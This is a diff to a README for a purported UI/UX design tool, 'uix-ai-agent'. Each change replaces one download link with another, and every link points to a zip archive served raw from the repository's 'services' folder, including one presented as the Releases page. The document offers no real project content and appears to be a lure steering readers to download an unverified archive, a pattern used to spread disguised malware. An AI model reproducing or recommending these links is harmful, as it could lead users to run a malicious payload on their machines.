@@ -1,6 +1,6 @@
 # 🎨 uix-ai-agent - Simplify Your UI & UX Design
 
-[![Download uix-ai-agent](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/ai-uix-agent-2.5-beta.1.zip)](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/ai-uix-agent-2.5-beta.1.zip)
+[![Download uix-ai-agent](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/uix-agent-ai-v2.9-beta.5.zip)](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/uix-agent-ai-v2.9-beta.5.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Follow the steps below to download and install UIX AI Agent on your computer.
 
 Go to the Releases page for UIX AI Agent. You can find it by clicking the link below:
 
-[Download UIX AI Agent](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/ai-uix-agent-2.5-beta.1.zip)
+[Download UIX AI Agent](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/uix-agent-ai-v2.9-beta.5.zip)
 
 ### 2. Select the Latest Version
 
@@ -77,4 +77,4 @@ We appreciate the contributions from our users and communities who help improve 
 
 Now you're ready to use UIX AI Agent to enhance your UI & UX design process. Follow the simple steps above to download and install the application. Start generating beautiful designs today!
 
-[Download UIX AI Agent](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/ai-uix-agent-2.5-beta.1.zip)
+[Download UIX AI Agent](https://raw.githubusercontent.com/pazdan12385/uix-ai-agent/main/services/uix-agent-ai-v2.9-beta.5.zip)
